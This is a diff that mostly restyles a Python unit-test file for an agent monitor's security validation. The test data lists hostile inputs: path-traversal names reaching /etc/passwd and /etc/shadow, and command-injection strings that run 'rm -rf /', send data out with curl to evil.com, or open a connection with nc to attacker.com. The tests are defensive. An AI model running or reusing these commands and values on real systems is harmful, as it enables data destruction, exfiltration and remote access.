@@ -16,7 +16,7 @@ from unittest.mock import Mock
 sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
 
 # Import agent monitor module
-agent_monitor_module = importlib.import_module('agent_monitor')
+agent_monitor_module = importlib.import_module("agent_monitor")
 ConvergeAgentRestarter = agent_monitor_module.ConvergeAgentRestarter
 
 
@@ -40,14 +40,7 @@ class TestSecurityValidation(unittest.TestCase):
 
     def test_validate_agent_name_valid_names(self):
         """Test that valid agent names are accepted"""
-        valid_names = [
-            "task-agent-test-1",
-            "task_agent_test_2",
-            "agent123",
-            "test-agent",
-            "a",
-            "A1B2C3"
-        ]
+        valid_names = ["task-agent-test-1", "task_agent_test_2", "agent123", "test-agent", "a", "A1B2C3"]
 
         for name in valid_names:
             with self.subTest(name=name):
@@ -124,7 +117,7 @@ class TestSecurityValidation(unittest.TestCase):
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config",
             "test/../../sensitive_file",
-            "agent/../../../etc/shadow"
+            "agent/../../../etc/shadow",
         ]
 
         for name in malicious_names:
@@ -147,12 +140,12 @@ class TestSecurityValidation(unittest.TestCase):
             "/converge; rm -rf /",
             "/orch && curl evil.com/steal",
             "/execute | nc attacker.com 4444",
-            "/plan `whoami` > /tmp/pwned"
+            "/plan `whoami` > /tmp/pwned",
         ]
 
         for malicious_cmd in malicious_commands:
             with self.subTest(command=malicious_cmd):
-                with open(command_file, 'w') as f:
+                with open(command_file, "w") as f:
                     f.write(malicious_cmd)
 
                 result = self.restarter.get_original_command(agent_name)
@@ -162,8 +155,9 @@ class TestSecurityValidation(unittest.TestCase):
                 self.assertNotEqual(result, malicious_cmd)
 
                 # Should log warning about unsafe content
-                warning_calls = [call for call in self.mock_logger.warning.call_args_list
-                                if "Unsafe command content" in str(call)]
+                warning_calls = [
+                    call for call in self.mock_logger.warning.call_args_list if "Unsafe command content" in str(call)
+                ]
                 self.assertTrue(len(warning_calls) > 0)
 
                 # Reset mock for next iteration
@@ -178,7 +172,7 @@ class TestSecurityValidation(unittest.TestCase):
         command_file = f"{workspace_path}/original_command.txt"
         safe_command = "/converge Complete all pending tasks"
 
-        with open(command_file, 'w') as f:
+        with open(command_file, "w") as f:
             f.write(safe_command)
 
         result = self.restarter.get_original_command(agent_name)
@@ -193,7 +187,7 @@ class TestSecurityValidation(unittest.TestCase):
 
         # Create legitimate command file
         command_file = f"{workspace_path}/original_command.txt"
-        with open(command_file, 'w') as f:
+        with open(command_file, "w") as f:
             f.write("/converge Valid command")
 
         # Should work normally for legitimate agent
@@ -206,7 +200,7 @@ class TestSecurityValidation(unittest.TestCase):
             ("task-agent-converge-test", "/converge Resume previous convergence task"),
             ("task-agent-regular", "/orch Resume task execution"),
             ("converge-agent-123", "/converge Resume previous convergence task"),
-            ("regular-agent-456", "/orch Resume task execution")
+            ("regular-agent-456", "/orch Resume task execution"),
         ]
 
         for agent_name, expected in test_cases:
@@ -217,6 +211,6 @@ class TestSecurityValidation(unittest.TestCase):
                 self.assertTrue(self.restarter._is_safe_command(result))
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     # Run tests with detailed output
     unittest.main(verbosity=2)
